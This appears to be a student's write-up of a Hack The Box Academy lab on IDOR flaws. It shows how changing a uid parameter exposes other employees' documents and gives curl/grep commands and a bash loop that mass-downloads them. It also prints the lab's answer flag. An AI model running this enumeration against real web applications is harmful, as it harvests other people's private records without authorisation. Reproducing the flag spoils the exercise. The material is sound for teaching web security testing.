# Mass IDOR Enumeration

### Insecure Parameters

web application that hosts employee records:

<figure><img src="https://academy.hackthebox.com/storage/modules/134/web_attacks_idor_employee_manager.jpg" alt=""><figcaption><p>Employee Manager</p></figcaption></figure>

<figure><img src="https://academy.hackthebox.com/storage/modules/134/web_attacks_idor_documents.jpg" alt=""><figcaption><p>http://SERVER_IP:PORT/documents.php?uid=1</p></figcaption></figure>

we are logged in as employee who as `uid=1`, In the web app we see the documents uploaded by our user. the links of the files are.

```html
/documents/Invoice_1_09_2021.pdf
/documents/Report_1_10_2021.pdf
```

If we change the uid value to `uid=2`, we will see that the links of the documents changed to&#x20;

```html
/documents/Invoice_2_08_2020.pdf
/documents/Report_2_12_2020.pdf
```

This is a common mistake found in web applications suffering from IDOR vulnerabilities, as they place the parameter that controls which user documents to show under our control while having no access control system on the back-end.

### Mass Enumeration

Although we could enumerate manually and get the documents, it is not efficient. It's better to automate the task using Burp Intruder or ZAP Fuzzer to retrive the files.

To do so, we check the HTML source code of the files.

```html
<li class='pure-tree_link'><a href='/documents/Invoice_3_06_2020.pdf' target='_blank'>Invoice</a></li>
<li class='pure-tree_link'><a href='/documents/Report_3_01_2020.pdf' target='_blank'>Report</a></li>
```

**pick any unique word to be able to `grep` the link of the file**. (we know each link starts with \
`<li class='pure-tree_link'>`

```shell-session
curl -s "http://SERVER_IP:PORT/documents.php?uid=1" | grep "<li class='pure-tree_link'>"
```

**Using Regex pattern to grep**

```shell-session
curl -s "http://SERVER_IP:PORT/documents.php?uid=3" | grep -oP "\/documents.*?.pdf"
```

> match strings between /documents and .pdf

simple bash script to get the documents with different uid

```bash
#!/bin/bash

url="http://SERVER_IP:PORT"

for i in {1..10}; do
        for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "\/documents.*?.pdf"); do
                wget -q $url/$link
        done
done
```

### Assessment

get a list of documents of the first 20 user uid's in /documents.php, one of which should have a '.txt' file with the flag.

<figure><img src="../../../.gitbook/assets/image (95) (1).png" alt=""><figcaption><p>Send request to intruder</p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (98).png" alt=""><figcaption><p>payload 1-20</p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (79).png" alt=""><figcaption><p>request number 15 has very different size of response.</p></figcaption></figure>

We found the flag where `uid=15`

<figure><img src="../../../.gitbook/assets/image (97).png" alt=""><figcaption><p>HTB{4ll_f1l35_4r3_m1n3}</p></figcaption></figure>

